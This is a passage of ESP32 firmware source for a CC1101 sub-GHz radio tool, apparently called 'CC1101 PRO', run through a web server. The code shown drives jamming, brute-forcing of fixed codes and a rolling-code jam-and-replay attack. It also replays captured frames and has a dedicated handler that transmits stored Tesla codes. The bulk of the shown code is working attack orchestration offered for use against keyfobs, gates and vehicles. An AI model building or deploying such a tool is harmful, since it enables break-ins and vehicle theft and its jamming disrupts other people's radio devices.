                   : 0;
  uint8_t bruteProg = (bruteState.totalCodes > 0)
                        ? (uint8_t)(bruteState.currentCode * 100UL / bruteState.totalCodes)
                        : 0;

  String json = "{";
  json += "\"active\":" + String(stbState.active ? "true" : "false") + ",";
  json += "\"phaseIdx\":" + String((int)stbState.phase) + ",";
  json += "\"phase\":\"" + String(stbState.phase == STB_IDLE ? "IDLE" : stbState.phase == STB_SCANNING       ? "SCANNING"
                                                                      : stbState.phase == STB_SCAN_COMPLETE  ? "SCAN_OK"
                                                                      : stbState.phase == STB_BRUTE_STARTING ? "STARTING"
                                                                      : stbState.phase == STB_BRUTE_RUNNING  ? "BRUTING"
                                                                                                             : "DONE")
          + "\",";
  json += "\"scan\":{";
  json += "\"progress\":" + String(scanProg) + ",";
  json += "\"current\":" + String(stbState.scanCurrent, 2) + ",";
  json += "\"bestFreq\":" + String(stbState.scanBestFreq, 2) + ",";
  json += "\"bestRSSI\":" + String(stbState.scanBestRSSI) + "},";
  json += "\"brute\":{";
  json += "\"progress\":" + String(bruteProg) + ",";
  json += "\"current\":" + String(bruteState.currentCode) + ",";
  json += "\"total\":" + String(bruteState.totalCodes) + ",";
  json += "\"speed\":" + String(bruteState.codesPerSecond) + "},";
  json += "\"topFreqs\":[";
  for (int i = 0; i < stbState.topCount && i < 5; i++) {
    if (i > 0) json += ",";
    json += "{\"freq\":" + String(stbState.topFreqs[i], 2) + ",\"rssi\":" + String(stbState.topRSSI[i]) + "}";
  }
  json += "]}";
  server.send(200, "application/json", json);
}

// ═══════════════════════════════════════════════════════════════
// ROLLING CODE HANDLER
// ═══════════════════════════════════════════════════════════════
void handleRollingStart() {
  float freq = server.hasArg("freq") ? server.arg("freq").toFloat() : 433.92;
  uint8_t maxCodes = server.hasArg("max") ? server.arg("max").toInt() : 3;
  uint32_t jam = server.hasArg("jam") ? server.arg("jam").toInt() : 10000;
  uint32_t rx = server.hasArg("rx") ? server.arg("rx").toInt() : 20000;
  if (maxCodes > MAX_ROLLING_CODES) maxCodes = MAX_ROLLING_CODES;
  initRollingCodeAttack(freq, maxCodes, jam, rx);
  server.send(200, "text/plain", "OK rolling=START");
}
void handleRollingStop() {
  stopRollingCodeAttack();
  server.send(200, "text/plain", "OK rolling=STOP");
}
void handleReplayRolling() {
  uint8_t idx = server.hasArg("code") ? server.arg("code").toInt() : 0;
  replayRollingCode(idx);
  server.send(200, "text/plain", "OK replay=" + String(idx));
}
void handleGetRolling() {
  String json = "{";
  json += "\"active\":" + String(rollingState.active ? "true" : "false") + ",";
  json += "\"jamming\":" + String(rollingState.jamming ? "true" : "false") + ",";
  json += "\"count\":" + String(rollingState.captureCount) + ",";
  json += "\"max\":" + String(rollingState.maxCaptures) + "}";
  server.send(200, "application/json", json);
}
void handleGetRollingCodes() {
  String json = "[";
  for (int i = 0; i < rollingState.captureCount; i++) {
    if (i > 0) json += ",";
    CapturedRollingCode &c = rollingState.codes[i];
    json += "{";
    json += "\"hex\":\"" + byteToHexString(c.data, c.length) + "\",";
    json += "\"length\":" + String(c.length) + ",";
    json += "\"rssi\":" + String(c.rssi) + ",";
    json += "\"protocol\":\"" + String(c.protocol) + "\",";
    json += "\"replayed\":" + String(c.replayed ? "true" : "false") + "}";
  }
  json += "]";
  server.send(200, "application/json", json);
}

// ═══════════════════════════════════════════════════════════════
// TESLA / MANUAL
// ═══════════════════════════════════════════════════════════════
void handleTesla() {
  int rep = server.hasArg("repeat") ? server.arg("repeat").toInt() : 5;
  int variant = server.hasArg("variant") ? server.arg("variant").toInt() : 0;

  float oldFreq = current_freq;
  int oldMod = current_modulation;
  current_freq = 433.92f;
  current_modulation = 2;
  cc1101initialize();

  const byte *code = (variant == 1) ? TESLA_CODE_MODEL3 : TESLA_CODE;
  int clen = (variant == 1) ? TESLA_CODE3_LENGTH : TESLA_CODE_LENGTH;

  for (int i = 0; i < rep; i++) {
    ELECHOUSE_cc1101.SendData((byte *)code, clen);
    stats.totalTX++;
    delay(100);
  }
  current_freq = oldFreq;
  current_modulation = oldMod;
  cc1101initialize();
  ELECHOUSE_cc1101.SetRx();
  server.send(200, "text/plain", "OK tesla=v" + String(variant) + "x" + String(rep));
}

// ═══════════════════════════════════════════════════════════════
// STATUS / CONFIG / SYSTEM
// ═══════════════════════════════════════════════════════════════

// ── MANUELL SENDEN ────────────────────────────────────────────────
void handleManualTX() {
  if (!server.hasArg("data")) {
    server.send(400, "text/plain", "ERR_NO_DATA");
    return;
  }
  String hexStr = server.arg("data");
  float freq = server.hasArg("freq") ? server.arg("freq").toFloat() : current_freq;
  int mod = server.hasArg("mod") ? server.arg("mod").toInt() : current_modulation;
  int rep = server.hasArg("repeat") ? server.arg("repeat").toInt() : 5;
  int del = server.hasArg("delay") ? server.arg("delay").toInt() : 100;
  int len = hexStr.length() / 2;
  if (len <= 0 || len >= CCBUFFERSIZE) {
    server.send(400, "text/plain", "ERR_LEN");
    return;
  }
  hextoascii(ccsendingbuffer, (byte *)hexStr.c_str(), hexStr.length());
  float oldFreq = current_freq;
  int oldMod = current_modulation;
  if (freq != current_freq || mod != current_modulation) {
    current_freq = freq;
    current_modulation = mod;
    ELECHOUSE_cc1101.setMHZ(freq);
    ELECHOUSE_cc1101.setModulation(mod);
  }
  for (int i = 0; i < rep; i++) {
    ELECHOUSE_cc1101.SendData(ccsendingbuffer, len);
    stats.totalTX++;
    if (del > 0) delay(del);
  }
  if (freq != oldFreq || mod != oldMod) {
    current_freq = oldFreq;
    current_modulation = oldMod;
    ELECHOUSE_cc1101.setMHZ(oldFreq);
    ELECHOUSE_cc1101.setModulation(oldMod);
  }
  ELECHOUSE_cc1101.SetRx();
  server.send(200, "text/plain", "OK manual tx=" + String(len) + "B x" + String(rep));
}

void handleGetStatus() {
  lastRSSI = ELECHOUSE_cc1101.getRssi();
  int snr = lastRSSI - noiseFloor;
  uint32_t upSec = (millis() - systemStartTime) / 1000;
  uint32_t freeHeap = ESP.getFreeHeap();
  uint32_t totHeap = ESP.getHeapSize();
  uint8_t heapPct = (uint8_t)(freeHeap * 100UL / totHeap);

  String json = "{";
  json += "\"rssi\":" + String(lastRSSI) + ",";
  json += "\"snr\":" + String(snr) + ",";
  json += "\"noise\":" + String(noiseFloor) + ",";
  json += "\"freq\":" + String(current_freq, 2) + ",";
  json += "\"mode\":\"" + getModeName(currentMode) + "\",";
  json += "\"system\":{";
  json += "\"uptime\":\"" + formatUptime(upSec) + "\",";
  json += "\"freeRAM\":" + String(freeHeap) + ",";
  json += "\"totalRAM\":" + String(totHeap) + ",";
  json += "\"ramPct\":" + String(heapPct) + ",";
  json += "\"cpuFreq\":" + String(ESP.getCpuFreqMHz()) + "},";
  json += "\"wifi\":{";
  json += "\"mode\":\"" + wifiMode + "\",";
  json += "\"ssid\":\"" + connectedSSID + "\",";
  json += "\"ip\":\"" + (wifiMode == "AP" ? WiFi.softAPIP().toString() : WiFi.localIP().toString()) + "\"},";
  json += "\"buffers\":{";
  json += "\"frames\":" + String(frameCount) + ",";
  json += "\"maxFrames\":" + String(MAX_FRAMES) + ",";
  json += "\"rawBytes\":" + String(bigrecordingbufferindex) + ",";
  json += "\"rolling\":" + String(rollingState.captureCount) + "},";
  json += "\"stats\":{";
  json += "\"tx\":" + String(stats.totalTX) + ",";
  json += "\"rx\":" + String(stats.totalRX) + ",";
  json += "\"brute\":" + String(stats.bruteAttempts) + "},";
  if (bruteState.running) {
    uint8_t p = (bruteState.totalCodes > 0)
                  ? (uint8_t)(bruteState.currentCode * 100UL / bruteState.totalCodes)
                  : 0;
    json += "\"brute\":{";
    json += "\"running\":true,";
    json += "\"protocol\":\"" + String(bruteState.protocol.name) + "\",";
    json += "\"current\":" + String(bruteState.currentCode) + ",";
    json += "\"total\":" + String(bruteState.totalCodes) + ",";
    json += "\"speed\":" + String(bruteState.codesPerSecond) + ",";
    json += "\"progress\":" + String(p) + ",";
    json += "\"sent\":" + String(bruteState.totalSent) + "},";
  }
  json += "\"peakRSSI\":" + String(peakRSSI) + ",";
  json += "\"peakFreq\":" + String(peakFreq, 2) + "}";
  server.send(200, "application/json", json);
}

void handleSaveConfig() {
  saveCC1101Config();
  server.send(200, "text/plain", "OK");
}

void handleInitCC() {
  stopBruteForce();
  stopScanThenBrute();
  stopRollingCodeAttack();
  currentMode = MODE_IDLE;
  cc1101initialize();
  server.send(200, "text/plain", "OK init");
}

void handleStopAll() {
  stopBruteForce();
  stopScanThenBrute();
  stopRollingCodeAttack();
  if (currentMode == MODE_JAM) {
    digitalWrite(gdo0, LOW);
  }
  currentMode = MODE_IDLE;
  ELECHOUSE_cc1101.setCCMode(1);
  ELECHOUSE_cc1101.setPktFormat(0);
  ELECHOUSE_cc1101.setSidle();
  server.send(200, "text/plain", "OK stopall");
}

// ═══════════════════════════════════════════════════════════════
// WIFI HANDLER
// ═══════════════════════════════════════════════════════════════
void handleWifiStatus() {
  String ip = (wifiMode == "AP")
                ? WiFi.softAPIP().toString()
                : WiFi.localIP().toString();
  int wrssi = (wifiMode == "Client") ? WiFi.RSSI() : 0;
  String json = "{\"mode\":\"" + wifiMode + "\",";
  json += "\"ssid\":\"" + connectedSSID + "\",";
  json += "\"ip\":\"" + ip + "\",";
  json += "\"wifiRssi\":" + String(wrssi) + "}";
  server.send(200, "application/json", json);
}
void handleWifiScan() {
  int n = WiFi.scanNetworks();
  String json = "[";
  for (int i = 0; i < n; i++) {
    if (i > 0) json += ",";
    json += "{\"ssid\":\"" + WiFi.SSID(i) + "\",";
    json += "\"rssi\":" + String(WiFi.RSSI(i)) + ",";
    json += "\"encryption\":" + String(WiFi.encryptionType(i) != WIFI_AUTH_OPEN ? 1 : 0) + "}";
  }
  json += "]";
  server.send(200, "application/json", json);
}
void handleWifiConnect() {
  if (!server.hasArg("ssid")) {
    server.send(400, "text/plain", "NO_SSID");
    return;
  }
  String ssid = server.arg("ssid");
  String pass = server.hasArg("pass") ? server.arg("pass") : "";
  if (ssid.length() == 0) {
    server.send(400, "text/plain", "EMPTY_SSID");
    return;
  }
  saveWifiConfig(ssid, pass, false);
  server.send(200, "text/plain", "OK neustart...");
  delay(1000);
  ESP.restart();
}
void handleWifiAP() {
  saveWifiConfig("", "", true);
  server.send(200, "text/plain", "OK ap-mode neustart...");
  delay(500);
  ESP.restart();
}

// ═══════════════════════════════════════════════════════════════
// OTA HANDLER
// ═══════════════════════════════════════════════════════════════
void handleOTA() {
  HTTPUpload &upload = server.upload();

  if (upload.status == UPLOAD_FILE_START) {
    otaState.active = true;
    otaState.success = false;
    otaState.error = "";
    otaState.written = 0;
    otaState.progress = 0;
    currentMode = MODE_OTA;
    Serial.println("OTA Start: " + String(upload.filename));
    if (!Update.begin(UPDATE_SIZE_UNKNOWN)) {
      otaState.error = Update.errorString();
      Serial.println("OTA Begin Fehler: " + otaState.error);
    }

  } else if (upload.status == UPLOAD_FILE_WRITE) {
    if (Update.write(upload.buf, upload.currentSize) != upload.currentSize) {
      otaState.error = Update.errorString();
    }
    otaState.written += upload.currentSize;
    if (upload.totalSize > 0)
      otaState.progress = (uint8_t)(otaState.written * 100 / upload.totalSize);
    updateDisplay();

  } else if (upload.status == UPLOAD_FILE_END) {
    if (Update.end(true)) {
      otaState.success = true;
      otaState.progress = 100;
      Serial.println("OTA OK! " + String(otaState.written) + " Bytes");
      updateDisplay();
      delay(1000);
    } else {
      otaState.error = Update.errorString();
      Serial.println("OTA End Fehler: " + otaState.error);
    }
    otaState.active = false;
    currentMode = MODE_IDLE;
  }
}
void handleOTAResult() {
  if (Update.hasError()) {
    server.send(500, "text/plain", "FEHLER: " + String(Update.errorString()));
  } else {
    server.send(200, "text/plain", "OK OTA erfolgreich! Neustart...");
    delay(500);
    ESP.restart();
  }
}

// ═══════════════════════════════════════════════════════════════
// SETUP
// ═══════════════════════════════════════════════════════════════
void setup() {
  Serial.begin(115200);
  delay(300);
  Serial.println("\n===========================================");
  Serial.println("  CC1101 PRO v0.8.1 - Blue EDITION");
  Serial.println("===========================================");

  systemStartTime = millis();
  memset(&bruteState, 0, sizeof(bruteState));
  memset(&stbState, 0, sizeof(stbState));
  memset(&rollingState, 0, sizeof(rollingState));
  memset(&otaState, 0, sizeof(otaState));
  memset(&stats, 0, sizeof(stats));
  memset(&spectrumData, 0, sizeof(spectrumData));
  memset(frames, 0, sizeof(frames));

  stats.sessionStart = millis();

  // OLED
  Wire.begin(21, 22);
  if (display.begin(SSD1306_SWITCHCAPVCC, OLED_ADDRESS)) {
    displayEnabled = true;
    display.clearDisplay();
    display.setTextSize(2);
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(0, 8);
    display.println("CC1101");
    display.setCursor(0, 30);
    display.println("PRO v0.8.1");
    display.setTextSize(1);
    display.setCursor(0, 55);
    display.println("Initialisiere...");
    display.display();
    delay(1500);
    Serial.println("OK OLED OK");
  } else {
    Serial.println("!  OLED nicht gefunden (SDA=21 SCL=22)");
  }

  // EEPROM
  EEPROM.begin(EPROMSIZE);

  // CC1101 Config laden
  loadCC1101Config();

  // CC1101 init
  cc1101initialize();
  delay(100);
  if (ELECHOUSE_cc1101.getCC1101()) {
    Serial.println("OK CC1101 OK @ " + String(current_freq, 2) + " MHz");
    if (displayEnabled) {
      display.clearDisplay();
      display.setTextSize(1);
      display.setCursor(0, 0);
      display.println("CC1101 OK");
      display.setCursor(0, 12);
      display.print(current_freq, 2);
      display.println(" MHz");
      display.display();
      delay(500);
    }
  } else {
    Serial.println("ERR CC1101 NICHT GEFUNDEN!");
    Serial.println("   Pruefe SPI: SCK=18 MISO=19 MOSI=23 SS=5");
    if (displayEnabled) {
      display.clearDisplay();
      display.setCursor(0, 0);
      display.println("CC1101 FEHLER!");
      display.setCursor(0, 12);
      display.println("SPI pruefen!");
      display.display();
    }
  }

  // WiFi
  setupWiFi();

  // HTTP Routes
  server.on("/", HTTP_GET, handleRoot);
  server.on("/setfreq", HTTP_GET, handleSetFreq);
  server.on("/setmod", HTTP_GET, handleSetMod);
  server.on("/setpower", HTTP_GET, handleSetPower);
  server.on("/setdev", HTTP_GET, handleSetDev);
  server.on("/setdrate", HTTP_GET, handleSetDataRate);
  server.on("/setch", HTTP_GET, handleSetChannel);
  server.on("/setrxbw", HTTP_GET, handleSetRxBW);
  server.on("/setsyncmode", HTTP_GET, handleSetSyncMode);
  server.on("/setsyncwordh", HTTP_GET, handleSetSyncWordH);
  server.on("/setsyncwordl", HTTP_GET, handleSetSyncWordL);
  server.on("/setpktformat", HTTP_GET, handleSetPktFormat);
  server.on("/setlengthconfig", HTTP_GET, handleSetLengthConfig);
  server.on("/setcrc", HTTP_GET, handleSetCrc);
  server.on("/setmanchester", HTTP_GET, handleSetManchester);
  server.on("/setfec", HTTP_GET, handleSetFEC);
  server.on("/setwhitedata", HTTP_GET, handleSetWhiteData);
  server.on("/setdcfilter", HTTP_GET, handleSetDCFilter);
  server.on("/setappendstatus", HTTP_GET, handleSetAppendStatus);
  server.on("/tx", HTTP_GET, handleTX);
  server.on("/rx", HTTP_GET, handleRX);
  server.on("/rec", HTTP_GET, handleREC);
  server.on("/jam", HTTP_GET, handleJam);
  server.on("/stopjam", HTTP_GET, handleStopJam);
  server.on("/getdata", HTTP_GET, handleGetData);
  server.on("/rawrx", HTTP_GET, handleRawRX);
  server.on("/rawrec", HTTP_GET, handleRawREC);
  server.on("/rawstop", HTTP_GET, handleRawStop);
  server.on("/getrawdata", HTTP_GET, handleGetRawData);
  server.on("/clearrawbuffer", HTTP_GET, handleClearRawBuffer);
  server.on("/getframes", HTTP_GET, handleGetFrames);
  server.on("/getframe", HTTP_GET, handleGetFrame);
  server.on("/replayframe", HTTP_GET, handleReplayFrame);
  server.on("/replayall", HTTP_GET, handleReplayAll);
  server.on("/clearframes", HTTP_GET, handleClearFrames);
  server.on("/deleteframe", HTTP_GET, handleDeleteFrame);
  server.on("/analyze", HTTP_GET, handleAnalyze);
  server.on("/analyzeframe", HTTP_GET, handleAnalyzeFrame);
  server.on("/calibrate", HTTP_GET, handleCalibrate);
  server.on("/scanstep", HTTP_GET, handleScanStep);
  server.on("/spectrum", HTTP_GET, handleSpectrum);
  server.on("/brutestart", HTTP_GET, handleBruteStart);
  server.on("/brutepause", HTTP_GET, handleBrutePause);
  server.on("/brutestop", HTTP_GET, handleBruteStop);
  server.on("/bruteprogress", HTTP_GET, handleBruteProgress);
  server.on("/brutefromframe", HTTP_GET, handleBruteFromFrame);
  server.on("/stbstart", HTTP_GET, handleSTBStart);
  server.on("/stbpause", HTTP_GET, handleSTBPause);
  server.on("/stbstop", HTTP_GET, handleSTBStop);
  server.on("/stbprogress", HTTP_GET, handleSTBProgress);
  server.on("/rollingstart", HTTP_GET, handleRollingStart);
  server.on("/rollingstop", HTTP_GET, handleRollingStop);
  server.on("/replayrolling", HTTP_GET, handleReplayRolling);
  server.on("/getrolling", HTTP_GET, handleGetRolling);
  server.on("/getrollingcodes", HTTP_GET, handleGetRollingCodes);
  server.on("/tesla", HTTP_GET, handleTesla);
  server.on("/manualtx", HTTP_GET, handleManualTX);
  server.on("/getstatus", HTTP_GET, handleGetStatus);
  server.on("/saveconfig", HTTP_GET, handleSaveConfig);
  server.on("/init", HTTP_GET, handleInitCC);
  server.on("/stopall", HTTP_GET, handleStopAll);
  server.on("/wifistatus", HTTP_GET, handleWifiStatus);
  server.on("/wifiscan", HTTP_GET, handleWifiScan);
  server.on("/wificonnect", HTTP_GET, handleWifiConnect);
  server.on("/wifiap", HTTP_GET, handleWifiAP);
  server.on("/ota", HTTP_POST, handleOTAResult, handleOTA);

  server.begin();
  Serial.println("OK Webserver OK");
  if (wifiMode == "AP") {
    Serial.println("Web: http://192.168.4.1");
    Serial.println("WiFi SSID: " + String(AP_SSID) + "  Pass: " + String(AP_PASSWORD));
  } else {
    Serial.println("Web: http://" + WiFi.localIP().toString());
  }
  Serial.println("===========================================\n");
}

// ═══════════════════════════════════════════════════════════════
// LOOP - VOLLSTÄNDIG NON-BLOCKING
// ═══════════════════════════════════════════════════════════════
void loop() {
  server.handleClient();
  yield();

  // OLED Update alle 500ms
  static unsigned long lastDisplay = 0;
  if (millis() - lastDisplay > 500) {
    updateDisplay();
    lastDisplay = millis();
  }

  // RX / REC
  if (currentMode == MODE_RX || currentMode == MODE_REC || currentMode == MODE_RAW_RX || currentMode == MODE_RAW_REC) {

    if (ELECHOUSE_cc1101.CheckReceiveFlag()) {
      if (ELECHOUSE_cc1101.CheckCRC()) {
        int len = ELECHOUSE_cc1101.ReceiveData(ccreceivingbuffer);
        if (len > 0 && len < CCBUFFERSIZE) {
          lastRSSI = ELECHOUSE_cc1101.getRssi();
          updateRSSIHistory(lastRSSI);
          stats.totalRX++;

          if (currentMode == MODE_RAW_RX || currentMode == MODE_RAW_REC) {
            for (int i = 0;
                 i < len && bigrecordingbufferindex < RECORDINGBUFFERSIZE;
                 i++) {
              bigrecordingbuffer[bigrecordingbufferindex++] = ccreceivingbuffer[i];
            }
          } else {
            byte textbuf[128] = { 0 };
            asciitohex(ccreceivingbuffer, textbuf, len);
            lastReceivedData = String((char *)textbuf);
            lastReceivedLen = len;

            if (currentMode == MODE_REC && frameCount < MAX_FRAMES) {
              Frame &f = frames[frameCount];
              memcpy(f.data, ccreceivingbuffer, len);
              f.length = len;
              f.timestamp = millis();
              f.rssi = lastRSSI;
              f.frequency = current_freq;
              f.protocol[0] = '\0';
              f.confidence = 0;
              f.valid = true;
              frameCount++;
              stats.totalFrames++;
              Serial.printf("[REC] Frame%d: %dB RSSI=%d\n",
                            frameCount - 1, len, lastRSSI);
            }
          }
          ELECHOUSE_cc1101.SetRx();
        }
      }
    }
    yield();
  }

  // Brute Force - max 50ms pro Loop-Runde
  if (bruteState.running && !bruteState.paused && (currentMode == MODE_BRUTE || currentMode == MODE_STB_BRUTE)) {
    static unsigned long lastBrute = 0;
    if (millis() - lastBrute >= 5) {
      processBruteForceChunk();
      lastBrute = millis();
      server.handleClient();
      yield();
    }
  }

  // Scan Then Brute - max 20ms pro Schritt
  if (stbState.active && !stbState.paused) {
    static unsigned long lastSTB = 0;
    if (millis() - lastSTB >= 20) {
      processScanThenBrute();
      lastSTB = millis();
      server.handleClient();
      yield();
    }
  }

  // Rolling Code Attack
  if (rollingState.active) {
    processRollingCodeAttack();
    server.handleClient();
    yield();
  }

  // RSSI alle 2s im IDLE aktualisieren
  static unsigned long lastRSSIupdate = 0;
  if (currentMode == MODE_IDLE && millis() - lastRSSIupdate > 2000) {
    lastRSSI = ELECHOUSE_cc1101.getRssi();
    updateRSSIHistory(lastRSSI);
    lastRSSIupdate = millis();
  }

  delay(1);
}
